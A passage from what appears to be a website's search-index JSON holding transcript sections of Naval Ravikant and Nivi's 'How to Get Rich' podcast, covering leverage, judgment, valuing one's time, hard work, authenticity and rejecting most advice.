then they eat the losses. But you see, just the accountability gives them some form of additional potential income. Then, they also have labor leverage because they have a bunch of people working for them. But it probably tops out right there. Property developers pocket the profit by applying capital leverage You can go one level above that and you can look at a property developer. This might be someone who is a contractor who did a bunch of houses, did a really good job, then decided to go into business for themselves and they go around looking for beaten down properties that have potential. They buy them, they either raise money from investors or front it themselves, they fix the place up, and then they sell it for twice what they bought it for. Maybe they only put in 20% more, so it\u2019s a healthy profit. So now a developer like that takes on more accountability, has more risk. They have more specific knowledge because now you have to know: which neighborhoods are worth buying in. Which lots are actually good or which lots are bad. What makes or breaks a specific property. You have to imagine the finished house that\u2019s going to be there, even when the property itself might look really bad right now. There\u2019s more specific knowledge, there\u2019s more accountability and risk, and now you also have capital leverage because you\u2019re also putting in money into the project. But conceivably, you could buy a piece of land or a broken-down house for $200,000 and turn it into a million dollar mansion and pocket all the difference. Architects, large developers and REITs are even higher in the stack One level beyond that might be a famous architect or a developer, where just having your name on a property, because you\u2019ve done so many great properties, increases its value. One level up from that, you might be a person who decides, well, I understand real estate, and I now know enough of the dynamics of real estate that rather than just build and flip my own properties or improve my own properties, I\u2019m gonna be a massive developer. I\u2019m going to build entire communities. Now another person might say, \u201cI like that leverage, but I don\u2019t want to manage all these people. I want to do it more through capital. So I\u2019m gonna start a real estate investment trust.\u201d That requires specific knowledge not just about investing in real estate and building real estate, but it also requires specific knowledge about the financial markets, and the capital markets, and how real estate trusts operate. Real estate tech companies apply the maximum leverage One level beyond that might be somebody who says, \u201cActually, I want to bring the maximum leverage to bear in this market, and the maximum specific knowledge.\u201d That person would say, \u201cWell, I understand real estate, and I understand everything from basic housing construction, to building properties and selling them, to how real estate markets move and thrive, and I also understand the technology business. I understand how to recruit developers, how to write code and how to build good product, and I understand how to raise money from venture capitalists and how to return it and how all of that works.\u201d Obviously not a single person may know this. You may pull a team together to do it where each have different skill sets, but that combined entity would have specific knowledge in technology and in real estate. It would have massive accountability because that company\u2019s name would be a very high risk, high reward effort attached to the whole thing, and people would devote their lives to it and take on significant risk. It would have leverage in code with lots of developers. It would have capital with investors putting money in and the founder\u2019s own capital. It would have labor of some of the highest quality labor that you can find, which is high quality engineers and designers and marketers who are working on the company. Then you may end up with a Trulia or a RedFin or a Zillow kind of company, and then the upside could potentially be in the billions of dollars, or the hundreds of millions of dollars. As you layer in more and more kinds of knowledge that can only be gained on the job and aren\u2019t common knowledge, and you layer in more and more accountability and risk-taking, and you layer in more and more great people working on it and more and more capital on it, and more and more code and media on it, you keep expanding the scope of the opportunity all the way from the day-laborer, who might just literally be scrappling on the ground with their hands, all the way up to somebody who started a real estate tech company and then took it public.","title":"Example: From Laborer to Entrepreneur"},{"location":"other/How%20to%20Get%20Rich/#judgment-is-the-decisive-skill","text":"In an age of nearly infinite leverage, judgment is the most important skill In an age of infinite leverage, judgment becomes the most important skill Nivi: We spoke about specific knowledge, we talked about accountability, we talked about leverage. The last skill that Naval talks about in his tweetstorm is judgment, where he says, that \u201cLeverage is a force multiplier for your judgment.\u201d Naval: We are now living in an age of nearly infinite leverage, and all the great fortunes are created through leverage. Your first job is to go and obtain leverage, and you can obtain leverage through permission by getting people to work for you, or by raising capital. Or you can get leverage permissionlessly by learning how to code or becoming good communicator and podcasting, broadcasting, creating videos, writing, etc. That\u2019s how you get leverage, but once you have leverage, what do you do with it? Well, the first part of your career\u2019s spent hustling to get leverage. Once you have the leverage, then you wanna slow down a bit, because your judgment really matters. It\u2019s like you\u2019ve gone from steering your sailboat around to now you\u2019re steering an ocean liner or a tanker. You have a lot more at risk, but you have a lot more to gain as well. You\u2019re carrying a much higher payload. In an age of infinite leverage, judgment becomes the most important skill. Warren Buffett is so wealthy now because of his judgment. Even if you were to take away all of Warren\u2019s money, tomorrow, investors would come out of the woodwork and hand him a $100 billion because they know his judgment is so good, and they would give him a big chunk of that $100 billion to invest. Everything else you do is setting you up to apply judgment Ultimately, everything else that you do is actually setting you up to apply your judgment. One of the big things that people rail on is CEO pay. For sure there\u2019s crony capitalism that goes on where these CEOs control their boards and the boards give them too much money. But, there are certain CEOs who definitely earned their keep because their judgment is better. If you\u2019re steering a big ship, if you\u2019re steering Google or Apple, and your judgment is 10 or 20 percent better than the next person\u2019s, society will literally pay you hundreds of millions of dollars more, because you\u2019re steering a $100 billion ship. If you\u2019re on course 10 or 20 percent of the time more often than the other person, the compounding results on that hundreds of billions of dollars you\u2019re managing will be so large that your CEO pay will be dwarfed in comparison. Demonstrated judgment, credibility around the judgment, is so critical. Warren Buffett wins here because he has massive credibility. He\u2019s been highly accountable. He\u2019s been right over and over in the public domain. He\u2019s built a reputation for very high integrity, so you can trust him. A person like that, people will throw infinite leverage behind him because of his judgment. Nobody asks him how hard he works; nobody asks him when he wakes up or when he goes to sleep. They\u2019re like, \u201cWarren, just do your thing.\u201d Judgment, especially demonstrated judgment, with high accountability, clear track record, is critical. Judgment is knowing the long-term consequences of your actions Nivi: Let\u2019s define judgment. I would define it as knowing the long-term effects of your decisions, or being able to predict the long-term effects of your decisions. Naval: It\u2019s funny. My definition of wisdom is knowing the long term consequences of your actions, so they\u2019re not all that different. Wisdom is just judgment on a personal domain. Wisdom applied to external problems I think is judgment. They\u2019re highly linked. But, yes, it\u2019s knowing the long term consequences of your actions and then making the right decision to capitalize on that. Without experience, judgment is often less than useless Judgment is very hard to build up. This is where both intellect and experience come in play. There are many problems with the so-called intellectuals in the ivory tower, but one of the reasons why Nassim Taleb rails against them is because they have no skin in the game. They have no real-world experience, so they just apply purely intellect. Intellect without any experience is often worse than useless because you get the confidence that the intellect gives you, and you get some of the credibility, but because you had no skin in the game, and you had no real experience, and no real accountability, you\u2019re just throwing darts. The real world is always far, far more complex than we can intellectualize. Especially all the interesting, fast-moving edge domains and problems, you can\u2019t get there without experience. If you are smart and you iterate fast, it\u2019s not even you put 10,000 hours into something, but you take 10,000 tries at something. The people with the best judgment are among the least emotional If you are smart and you have a lot of quick iterations, and you try to keep your emotions out of it, the people with the best judgment are actually among the least emotional. A lot of the best investors are considered almost robotic in that regard, but I wouldn\u2019t be surprised if even the best entrepreneurs often come across as unemotional. There is sort of this archetype of the passionate entrepreneur, and yeah, they have to care about what they\u2019re doing, but they also have to see very clearly what\u2019s actually happening. The thing that prevents you from seeing what\u2019s actually happening are your emotions. Our emotions are constantly clouding our judgment, and in investing, or in running companies, or in building products, or being an entrepreneur, emotions really get in the way. Emotions are what prevent you from seeing what\u2019s actually happening, until you can no longer resist the truth of what\u2019s happening, until it becomes too sudden, and then you\u2019re forced into suffering; which is sort of a breaking of this fantasy that you had put together. Nivi: To try and connect some of these concepts, I would say that, first, you\u2019re accountable for your judgment. Judgment is the exercise of wisdom. Wisdom comes from experience; and that experience can be accelerated through short iterations. Top investors often sound like philosophers Naval: And the reason why a lot of the top investors, a lot of the value investors, like if you read Jeremy Grantham, or you read Warren Buffet, or you read up on Michael Burry, these people sound like philosophers, or they are philosophers, or they\u2019re reading a lot of history books or science books. Like what are they doing, shouldn\u2019t they be reading investment books. No. Investment books are the worst place to learn about investment, because investment is a real-world activity that is highly multi-variate, all the advantages are always being competed away. It\u2019s always on the cutting-edge. What you actually just need is very, very broad-based judgment and thinking. The best way to do that is to study everything, including a lot of philosophy. Philosophy also makes you more stoic, makes you less emotional, and so you make better decisions; you have better judgment. The more outraged someone is, the worse their judgment One simple thing is I see \u2026 I go out on Twitter and it seems like half of Twitter is outraged at something at all times. You can go within someone\u2019s Twitter feed and get at least some semblance of what it must be like to be in their head all the time. The more outraged somebody is, I guarantee you, the worse their judgment is. If someone\u2019s constantly tweeting political outrage, and just see like an angry person getting into fights, you don\u2019t want to hand this person the keys to your car, let alone the keys to your company.","title":"Judgment Is the Decisive Skill"},{"location":"other/How%20to%20Get%20Rich/#set-an-aspirational-hourly-rate","text":"Outsource tasks that cost less than your hourly rate Set and enforce an aspirational hourly rate Nivi: We covered the skills you need to get rich. They included specific knowledge, accountability, leverage, judgment and life-long learning. Let\u2019s talk about the importance of working hard and valuing your time. Naval: No one is going to value you more than you value you. Set a high personal hourly rate, and stick to it. When I was young, I decided I was worth a lot more than the market thought I was worth. And I started treating myself that way. Factor your time into every decision. Say you value your time at $100 an hour. If you decide to spend an hour driving across town to get something, you\u2019re effectively throwing away $100. Are you going to do that? Say you buy something from Amazon and they screw it up. Is it worth your time to return it? Is it worth the mental hassle? Keep in mind that you will have less time for work, including mentally high-output work. Do you want to use that time running errands and solving little problems? Or do you want to save it for the big stuff? The great scientists were terrible at managing their home lives. None of them had an organized room, or made social events on time, or sent their thank-you cards. You can\u2019t penny pinch your way to wealth You can spend your life however you want. But if you want to get rich, it has to be your top priority. It has to come before anything else, which means you can\u2019t penny-pinch. This is what people don\u2019t understand. You can penny-pinch your way to basic sustenance. You can keep expenses low and maybe retire early. That\u2019s perfectly valid. But we\u2019re here to talk about wealth creation. If you\u2019re going to create wealth, it has to be your number-one, overwhelming priority. My aspirational rate was $5,000/hr Fast-forward to your wealthy self and pick an intermediate hourly rate. Before I had any real money and you could hire me, I set an aspirational rate of $5,000 an hour. Of course, I still ended up doing stupid things like arguing with the electrician or returning the broken speaker. But I shouldn\u2019t have. And I did a lot less of it my friends. I would make a theatrical show out of throwing something in the trash or giving it to Salvation Army, rather than returning it or trying to fix it. I would argue with girlfriends, \u201cI don\u2019t do that. That\u2019s not a problem that I solve.\u201d I still argue that today with my wife and with my mother, when she hands me little to-do\u2019s. I say, \u201cI would rather hire you an assistant.\u201d This was true even when I didn\u2019t have money. If you can outsource something for less than your hourly rate, do it Another way to think about this: If you can outsource something\u2014or not do something\u2014for less than your hourly rate, outsource it or don\u2019t do it. If you can hire someone to do it for less than your hourly rate, hire them. That includes things like cooking. You may want to make your own healthy, home-cooked meals. But if you can outsource it, do that instead. People say, \u201cWhat about the joy of life? What about getting it right, just your way?\u201d Sure, you can do that. But you\u2019re not going to be wealthy, because you\u2019ve made something else a priority. Paul Graham said it well for Y Combinator startups. He said you should be working on your product and getting product-market fit, and you should be exercising and eating healthy. That\u2019s about it. That\u2019s all you have time for while you\u2019re on this mission. Your hourly rate should seem absurdly high Set a very high aspirational hourly rate for yourself, and stick to it. It should seem and feel absurdly high. If it doesn\u2019t, it\u2019s not high enough. Whatever you pick, my advice is to raise it. For the longest time, I used $5,000 an hour. If you extrapolate that out as an annual salary, it\u2019s multiple millions of dollars per year. I actually think I\u2019ve beaten it, which is interesting given that I\u2019m not the hardest worker. I work through bursts of energy when I\u2019m motivated to work on something.","title":"Set an Aspirational Hourly Rate"},{"location":"other/How%20to%20Get%20Rich/#work-as-hard-as-you-can","text":"Even though what you work on and who you work with are more important Work as hard as you can Naval: Let\u2019s talk about hard work. There\u2019s a battle that happens on Twitter a lot. Should you work hard or should you not? David Heinemeier Hansson says, \u201cIt\u2019s like you\u2019re slave-driving people.\u201d Keith Rabois says, \u201cNo, all the great founders worked their fingers to the bone.\u201d They\u2019re talking past each other. First of all, they\u2019re talking about two different things. David is talking about employees and a lifestyle business. If you\u2019re doing that, your number one priority is not getting wealthy. You have a job, a family and also your life. Keith is talking about the Olympics of startups. He\u2019s talking about the person going for the gold medal and trying to build a multi-billion dollar public company. That person has to get everything right. They have to have great judgment. They have to pick the right thing to work on. They have to recruit the right team. They have to work crazy hard. They\u2019re engaged in a competitive sprint. If getting wealthy is your goal, you\u2019re going to have to work as hard as you can. But hard work is no substitute for who you work with and what you work on. Those are the most important things. What you work on and who you work with are more important Marc Andreessen came up with the concept of the \u201c product-market fit .\u201d I would expand that to \u201cproduct-market-founder fit,\u201d taking into account how well a founder is personally suited to the business. The combination of the three should be your overwhelming goal. You can save a lot of time by picking the right area to work in. Picking the right people to work with is the next most important piece. Third comes how hard you work. They are like three legs of a stool. If you shortchange any one of them, the whole stool is going to fall. You can\u2019t easily pick one over the other. When you\u2019re building a business, or a career, first figure out: \u201cWhat should I be doing? Where is a market emerging? What\u2019s a product I can build that I\u2019m excited to work on, where I have specific knowledge?\u201d No matter how high your bar is, raise it Second, surround yourself with the best people possible. If there\u2019s someone greater out there to work with, go work with them. When people ask for advice about choosing the right startup to join, I say, \u201cPick the one that\u2019s going to have the best alumni network for you in the future.\u201d Look at the PayPal mafia\u2014they worked with a bunch of geniuses, so they all got rich. Pick the people with the highest intelligence, energy and integrity that you can find. And no matter how high your bar is, raise it. Finally, once you\u2019ve picked the right thing to work on and the right people, work as hard as you can. Nobody really works 80 hours a week This is where the mythology gets a little crazy. People who say they work 80-hour weeks, or even 120-hour weeks, often are just status signaling. It\u2019s showing off. Nobody really works 80 to 120 hours a week at high output, with mental clarity. Your brain breaks down. You won\u2019t have good ideas. The way people tend to work most effectively, especially in knowledge work, is to sprint as hard as they can while they feel inspired to work, and then rest. They take long breaks. It\u2019s more like a lion hunting and less like a marathoner running. You sprint and then you rest. You reassess and then you try again. You end up building a marathon of sprints. Inspiration is perishable Inspiration is perishable. When you have inspiration, act on it right then and there. If I\u2019m inspired to write a blog post or publish a tweetstorm, I should do it right away. Otherwise, it\u2019s not going to get out there. I won\u2019t come back to it. Inspiration is a beautiful and powerful thing. When you have it, seize it. Impatience with actions, patience with results People talk about impatience. When do you know to be impatient? When do you know to be patient? My glib tweet on this was: \u201c Impatience with actions, patience with results. \u201d I think that\u2019s a good philosophy for life. Anything you have to do, get it done. Why wait? You\u2019re not getting any younger. You don\u2019t want to spend your life waiting in line. You don\u2019t want to spend it traveling back and forth. You don\u2019t want to spend it doing things that aren\u2019t part of your mission. When you do these things, do them as quickly as you can and with your full attention so you do them well. Then be patient with the results because you\u2019re dealing with complex systems and a lot of people. It takes a long time for markets to adopt products. It takes time for people to get comfortable working with each other. It takes time for great products to emerge as you polish away. Impatience with actions, patience with results. If I discover a problem in one of my businesses, I won\u2019t sleep until the resolution is at least in motion. If I\u2019m on the board of a company, I\u2019ll call the CEO. If I\u2019m running the company, I\u2019ll call my reports. If I\u2019m responsible, I\u2019ll get on it, right then and there, and solve it. If I don\u2019t solve a problem the moment it happens\u2014or if I don\u2019t move towards solving it\u2014I have no peace. I have no rest. I have no happiness until the problem is solved. So I solve it as quickly as possible. I literally won\u2019t sleep until it\u2019s solved\u2014maybe that\u2019s just a personal characteristic. But it\u2019s worked out well in business.","title":"Work As Hard As You Can"},{"location":"other/How%20to%20Get%20Rich/#be-too-busy-to-do-coffee","text":"Ruthlessly decline meetings Be too busy to \u2018do coffee\u2019 while keeping an uncluttered calendar Naval: Another tweet was: \u201c You should be too busy to \u2018do coffee,\u2019 while still keeping an uncluttered calendar. \u201d People who know me know I\u2019m famous for simultaneously doing two things. First, I keep a very clean calendar. I have almost no meetings on it. When some people see my calendar, they almost weep. Second, I\u2019m busy all the time. I\u2019m always doing something. It\u2019s usually work-related. It\u2019s whatever high-impact thing that needs to be done, that I\u2019m most inspired to do. The only way to do that is to constantly, and ruthlessly, decline meetings. People want to \u201cdo coffee\u201d and build relationships. That\u2019s fine early in your career, when you\u2019re still exploring. But later in your career\u2014when you\u2019re exploiting, and there are more things coming at you than you have time for\u2014you have to ruthlessly cut meetings out of your life. Ruthlessly cut meetings If someone wants a meeting, see if they will do a call instead. If they want to call, see if they will email instead. If they want to email, see if they will text instead. And you probably should ignore most text messages\u2014unless they\u2019re true emergencies. You have to be utterly ruthless about dodging meetings. When you do meetings, make them walking meetings. Do standing meetings. Keep them short, actionable and small. Nothing is getting done in a meeting with eight people around a conference table. You are literally dying one hour at a time. Nivi: \u201cDoing coffee\u201d reminds me of an old quote, I think from Steve Jobs, when someone asked him why Apple didn\u2019t come to a convention. His response was something like, \u201cBecause we wouldn\u2019t be here working.\u201d Naval: I used to have a tough time turning people down for meetings. Now I just tell them outright, \u201cI don\u2019t do non-transactional meetings. I don\u2019t do meetings without a strict agenda. I don\u2019t do meetings unless we absolutely have to.\u201d Nivi used to do this. When people asked us for get-to-know-you meetings, he would say, \u201cWe don\u2019t do meetings unless it\u2019s life-and-death urgent.\u201d The person has to respond, \u201cYeah, it\u2019s life-and-death urgent\u201d or there\u2019s no meeting. People will meet with you when you have proof of work Busy people will take your meeting when you have something important or valuable. But you have to come with a proper calling card. It should be: \u201cHere\u2019s what I\u2019ve done. Here\u2019s what I can show you. Let\u2019s meet if this is useful to you, and I\u2019ll be respectful of your time.\u201d You have to build up credibility. For example, when a tech investor looks at a startup, the first thing they want to see is evidence of product progress. They don\u2019t just want to see a slide deck. Product progress is the entrepreneur\u2019s resume. It\u2019s an unfake-able resume. You have to do the work. To use a crypto analogy, you have to have proof of work. If you have that and you truly have something interesting, then you shouldn\u2019t hesitate to put it together in an email and send it. Even then, when asking for a meeting, you want to be actionable. Free your time and mind If you think you\u2019re going to \u201cmake it\u201d by networking and attending a bunch of meetings, you\u2019re probably wrong. Networking can be important early in your career. And you can get serendipitous with meetings. But the odds are pretty low. When you meet people hoping for that lucky break, you\u2019re relying on Type One luck , which is blind luck, and Type Two luck, which is hustle luck. But you\u2019re not getting Type Three or Type Four luck, which are the better kinds. This is where you spend time developing a reputation and working on something. You develop a unique point of view and are able to spot opportunities that others can\u2019t. A busy calendar and a busy mind will destroy your ability to do great things in this world. If you want to do great things\u2014whether you\u2019re a musician or entrepreneur or investor\u2014you need free time and a free mind.","title":"Be Too Busy to \u2018Do Coffee\u2019"},{"location":"other/How%20to%20Get%20Rich/#keep-redefining-what-you-do","text":"Become the best in the world at what you do Keep redefining what you do until you\u2019re the best at what you do Nivi: We talked about the importance of working hard and valuing your time. Next, there are a few tweets on the topic of working for the long-term. The first tweet is: \u201c Become the best in the world at what you do. Keep redefining what you do until this is true. \u201d Naval: If you really want to get paid in this world, you want to be number one at whatever you do. It can be niche\u2014that\u2019s the point. You can literally get paid for just being you. Some of the more successful people in the world are that way. Oprah gets paid for being Oprah. Joe Rogan gets paid for being Joe Rogan. They\u2019re being authentic to themselves. You want to be number one. And you want to keep changing what you do until you\u2019re number one. You can\u2019t just pick something arbitrary. You can\u2019t say, \u201cI\u2019m going to be the fastest runner in the world,\u201d and now you have to beat Usain Bolt. That\u2019s too hard of a problem. Keep changing your objective until it arrives at your specific knowledge, skill sets, position, capabilities, location and interests. Your objective and skills should converge to make you number one. When you\u2019re searching for what to do, you have two different foci to keep in mind. One is, \u201cI want to be the best at what I do.\u201d The second is, \u201cWhat I do is flexible, so that I\u2019m the best at it.\u201d You want to arrive at a comfortable place where you feel, \u201cThis is something I can be amazing at, while still being authentic to who I am.\u201d It\u2019s going to be a long journey. But now you know how to think about it. Find founder-product-market fit The most important thing for any company is to find product-market fit. But the most important thing for any entrepreneur is to find founder-product-market fit, where you are naturally inclined to to build the right product for a market. That\u2019s a three-foci problem. You have to make all three work at once. If you want to be successful in life, you have to get comfortable managing multi-variate problems and multiple-objective functions at once. This is one of those cases where you have to map at least two or three at once.","title":"Keep Redefining What You Do"},{"location":"other/How%20to%20Get%20Rich/#escape-competition-through-authenticity","text":"Nobody can compete with you on being you Competition will trap you in a lesser game Nivi: Let\u2019s discuss your tweet: \u201c Escape competition through authenticity. \u201d It sounds like part of this is a search for who you are. Naval: It\u2019s both a search and a recognition. Sometimes when we search our egos, we want to be something that we\u2019re not. Our friends and family are actually better at telling us who we are. Looking back at what we\u2019ve done is a better indicator of who we are. Peter Thiel talks a lot about how competition is besides the point . It\u2019s counterproductive. We\u2019re highly memetic creatures. We copy everybody around us. We copy our desires from them. If everyone around me is a great artist, I want to be an artist. If everyone around me is a great businessperson, I want to be a businessperson. If everybody around me is a social activist, I want to be a social activist. That\u2019s where my self-esteem will come from. You have to be careful when you get caught up in status games. You end up competing over things that aren\u2019t worth competing over. Peter Thiel talks about how he was going to be a law clerk because everybody at law school wanted to clerk for a Supreme Court justice or some famous judge. He got rejected, and that\u2019s what made him go into business. It helped him break out of a lesser game and into a greater game. Sometimes you get trapped in the wrong game because you\u2019re competing. The best way to escape competition\u2014to get away from the specter of competition, which is not just stressful and nerve-wracking but also will drive you to the wrong answer\u2014is to be authentic to yourself. No one can compete with you on being you If you are building and marketing something that\u2019s an extension of who you are, no one can compete with you. Who\u2019s going to compete with Joe Rogan or Scott Adams? It\u2019s impossible. Is somebody else going write a better Dilbert? No. Is someone going to compete with Bill Watterson and create a better Calvin and Hobbes ? No. Artist are, by definition, authentic. Entrepreneurs are authentic, too. Who\u2019s going to be Elon Musk? Who\u2019s going to be Jack Dorsey? These people are authentic, and the businesses and products they create are authentic to their desires and means. If somebody else came along and started launching rockets, I don\u2019t think it would faze Elon one bit. He\u2019s still going to get to Mars. Because that\u2019s his mission, insane as it seems. He\u2019s going to accomplish it. Authenticity naturally gets you away from competition. Does it mean that you want to be authentic to the point where there\u2019s no product-market fit? It may turn out that you\u2019re the best juggler on a unicycle. But maybe there isn\u2019t much of a market for that, even with YouTube videos. So you have to adjust until you find product-market fit. At least lean towards authenticity, towards getting away from competition. Competition leads to copy-catting and playing the completely wrong game. In entrepreneurship, the masses are never right In entrepreneurship, the masses are never right. If the masses knew how to build great things and create great wealth, we\u2019d all be rich by now. When you see a lot of competition, sometimes that indicates the masses have already arrived. It\u2019s already competed over too much. Or it\u2019s the wrong trend to begin with. On the other hand, if the whole market is empty, that can be a warning indicator. It can indicate you\u2019ve gone too authentic and should focus more on the product-market part of founder-product-market fit. There\u2019s a balance you have to find. Generally, people will make the mistake of paying too much attention to the competition. The great founders tend to be authentic iconoclasts. Combine your vocation and avocation Nivi: Do you think one way of getting to authenticity is by finding five or six various skills you already do and stacking them on top of each other, maybe not even in any purposeful way? If you are expressing who you are, you\u2019re going to be expressing all of these skills anyway. Naval: If you are successful, in the long-term you\u2019ll find you\u2019re almost doing all of your hobbies for a living, no matter what they are. As Robert Frost said, \u201c my goal in life is to unite my avocation with my vocation . \u201d That\u2019s really where life is going to lead you anyway. You\u2019re right about the skill stack. Everyone has multiple skills. We aren\u2019t one-dimensional creatures, even though that\u2019s how we portray ourselves in online profiles to get employed. You meet somebody and they say, \u201cI\u2019m a banker.\u201d Or, \u201cI\u2019m a bartender. Or \u201cI\u2019m a barber.\u201d Specialize in being you But people are multivariate. They have a lot of skills. One banker might be good at finance. Another one might be good at sales. A third one might be good at macroeconomic trends and have a feel for markets. Another one might be really good at picking individual stocks. Another might be good at maintaining relationships, rather than selling new relationships. Everyone\u2019s going to have various niches. And you\u2019re going to have multiple niches. It\u2019s not going to be just one. As you go through your career, you\u2019ll find you gravitate towards the things you\u2019re good at, which by definition are the things you enjoy doing. Otherwise, you wouldn\u2019t be good at them. You wouldn\u2019t have put in the time. Other people will push you towards the things you\u2019re good at, too. Because your smart bosses, co-workers and investors will realize you\u2019re world-class in this one thing. And you can recruit people to help you with other things. Ideally, you want to end up specializing in being you.","title":"Escape Competition Through Authenticity"},{"location":"other/How%20to%20Get%20Rich/#play-stupid-games-win-stupid-prizes","text":"Competition will blind you to greater games Businesses that seem like they\u2019re in direct competition really aren\u2019t Nivi: When you\u2019re being authentic, you don\u2019t mind competition that much. It pisses you off and inspires some fear, jealousy and other emotions. But you don\u2019t really mind because you\u2019re oriented towards the goal and the mission. Worst-case, you might get some ideas from them. And often there are ways to work with the competition in a positive way that ends up increasing the size of the market for you. Naval: It depends on the nature of the business. The best Silicon Valley tech industry businesses tend to be winner-take-all. When you see competition, it can make you fly into a rage. Because it really does endanger everything you\u2019ve built. If I\u2019m opening a restaurant and a more interesting version of the same restaurant opens in a different town, that\u2019s fantastic. I\u2019m going to copy what\u2019s working and drop what\u2019s not working. So it depends on the nature of the business. Often, businesses that seem to be in direct competition really aren\u2019t. They end up adjacent or slightly different. You\u2019re one step away from a completely different business, and sometimes you need to take that step. You\u2019re not going to take it if you\u2019re busy fighting over a booby prize. You\u2019re playing a stupid game. You\u2019re going to win a stupid prize. It\u2019s not obvious right now because you\u2019re blinded by competition. But three years from now, it\u2019ll be obvious. My first company got caught in the wrong game One of my first startups was Epinions , an online product review site that was independent of Amazon. That space eventually turned into TripAdvisor and Yelp, which is where we should have gone. We should have done more local reviews. A review of a scarce item like a local restaurant is more valuable than one of an item like a camera that has 1,000 reviews on Amazon. Before we could get there, we got caught up in the comparison-shopping game. We merged with DealTime and competed with a bunch of price-comparison engines\u2014mySimon, PriceGrabber, NexTag and Bizrate, which became Shopzilla. We were caught in fierce competition with each other. That whole space went to zero because Amazon won e-tail completely. There was no need for price comparison. Everyone just went to Amazon. We got the booby prize because we were caught up in competition with a bunch of our peers. We should have been looking at what the consumer really wanted and being authentic to ourselves, which was reviews, not price comparison. We should have gone further into esoteric items where customers had less data and wanted reviews more badly. If we stayed authentic to ourselves, we would have done better.","title":"Play Stupid Games, Win Stupid Prizes"},{"location":"other/How%20to%20Get%20Rich/#eventually-you-will-get-what-you-deserve","text":"On a long enough timescale, you will get paid On a long enough time scale, you will get paid Nivi: We\u2019re talking about working for the long-term. The next tweet on that topic: \u201c Apply specific knowledge, with leverage, and eventually you will get what you deserve. \u201d I would add: Apply judgment, apply accountability, and apply the skill of reading. Naval: This one is a glib way of saying, \u201cIt takes time.\u201d Once you have all of the pieces in place, there\u2019s still an indeterminate amount of time you have to put in. And if you\u2019re counting, you\u2019ll run out of patience before it arrives. You have to make sure you give these things time. Life is long. Charlie Munger had a line on this. Somebody asked him about making money. He said what the questioner actually was asking was, \u201c How can I become like you, except faster ?\u201d Everybody wants it immediately. But the world is an efficient place. Immediate doesn\u2019t work. You have to put in the time. You have to put in the hours. You have to put yourself in that position with specific knowledge, accountability, leverage and an authentic skill-set in order to be the best in the world at what you do. And then you have to enjoy it and keep doing it and doing it and doing it. Don\u2019t keep track. Don\u2019t keep count. Because if you do, you will run out of time. Looking back on my career, the people who I identified as brilliant and hardworking two decades ago are all successful now, almost without exception. On a long enough timescale, you will get paid. But it can easily be 10 or 20 years. Sometimes it\u2019s five. If it\u2019s five, or three, and it\u2019s a friend of yours who got there, it can drive you insane. But those are exceptions. And for every winner, there are multiple failures. One thing that\u2019s important in entrepreneurship: You just have to be right once. You get many, many shots on goal. You can take a shot on goal every three to five years, maybe every 10 at the slowest. Or once every year at the fastest, depending on how you\u2019re iterating with startups. But you only have to be right once. What are you really good at, that the market values? Nivi: Your eventual outcome will be equal to something like the distinctiveness of your specific knowledge; times how much leverage you can apply to that knowledge; times how often your judgment is correct; times how singularly accountable you are for the outcome; times how much society values what you\u2019re doing. Then you compound that with how long you can keep doing it and how long you can keep improving it through reading and learning. Naval: That\u2019s a really good way to summarize it. It\u2019s worth trying to sketch that equation out. That said, people try to apply mathematics to what is really philosophy. I\u2019ve seen this happen, where I say one thing and then I say another thing that seems contradictory if you treat it as math. But it\u2019s obviously in a different context. People will say, \u201cYou say, \u2018 Desire is suffering .\u2019\u201d You know, the Buddhist saying. \u201cAnd then you \u2018All greatness comes from suffering.\u2019 So does that mean all greatness comes from desire?\u201d This isn\u2019t math. You can\u2019t just carry variables around and form absolute logical outputs. You have to know when to apply things. One can\u2019t get too analytical about it. It\u2019s what a physicist would call \u201cfalse precision.\u201d When you take two made-up estimates and multiply them together, you get four degrees of precision. Those decimal points don\u2019t actually count. You don\u2019t have that data. You don\u2019t have that knowledge. The more estimated variables you have, the greater the error in the model. Adding more complexity to your decision-making process gets you a worse answer. You\u2019re better off picking the single biggest thing or two. Ask yourself: What am I really good at, according to observation and people I trust, that the market values? Those two variables alone are probably good enough. If you\u2019re good at it, you\u2019ll keep it up. You\u2019ll develop the judgment. If you\u2019re good at it and you like to do it, eventually people will give you the resources and you won\u2019t be afraid to take on accountability. So the other pieces will fall into place. Product-market fit is inevitable if you\u2019re doing something you love and the market wants it.","title":"Eventually You Will Get What You Deserve"},{"location":"other/How%20to%20Get%20Rich/#reject-most-advice","text":"Most advice is people giving you their winning lottery ticket numbers The best founders listen to everyone but make up their own mind Nivi: One of the tweets from the cutting-room floor was: \u201cAvoid people who got rich quickly. They\u2019re just giving you their winning lottery ticket numbers.\u201d Naval: This is generally true of most advice. It goes back to Scott Adams\u2014 systems not goals . If you ask a successful person what worked for them, they often read out the exact set of things that worked for them, which might not apply to you. They\u2019re just reading you their winning lottery ticket numbers. It\u2019s a little glib. There is something to be learned, but you can\u2019t take their exact circumstance and map it onto yours. The best founders I know read and listen to everyone. But then they ignore everyone and make up their own mind. They have their own internal model of how to apply things to their situation. And they do not hesitate to discard information. If you survey enough people, all of the advice will cancel to zero. You have to have your own point of view. When something is sent your way, you have to quickly decide: Is it true? Is it true outside of the context of how that person applied it? Is it true in my context? And then, Do I want to apply it? You have to reject most advice. But you have to listen to enough of it, and read enough of it, to know what to reject and what to accept. Even in this podcast, you should examine everything. If something doesn\u2019t feel true to you, put it down. Set it aside. If too many things seem untrue, delete this podcast. Advice offers anecdotes to recall later, when you get your own experience Nivi: I think the most dangerous part of taking advice is that the person who gave it to you isn\u2019t going to be around to tell you when it doesn\u2019t apply any more. Naval: I view the purpose of advice a little differently than most people. I view it as helping me have anecdotes and maxims that I can recall when I have my own direct experience and say, \u201cAh, that\u2019s what that person meant.\u201d Ninety percent of my tweets are maxims that become mental hooks to remind me when I\u2019m in that situation again. Like, \u201cOh, I\u2019m the one who tweeted, \u2018 If you can\u2019t see yourself working with someone for life, then don\u2019t work with them for a day. \u2019\u201d As soon as I know I\u2019m not going to be working with someone 10 years from now, then I have to start extricating myself from that relationship or investing less effort in it. I use tweets to compress my own learnings. Your brain space is finite. You have finite neurons. You can think of these as pointers, addresses, mnemonics to help you remember deep-seated principles where you have the underlying experience to back it up. If you don\u2019t have the underlying experience, then it reads like a collection of quotes. It\u2019s cool. It\u2019s inspirational for a moment. Maybe you make a nice poster out of it. But then you forget it and move on. These are compact ways for you to recall your own knowledge.","title":"Reject Most Advice"},{"location":"other/How%20to%20Get%20Rich/#a-calm-mind-a-fit-body-a-house-full-of-love","text":"When you\u2019re finally wealthy, you\u2019ll realize it wasn\u2019t what you were seeking in the first place 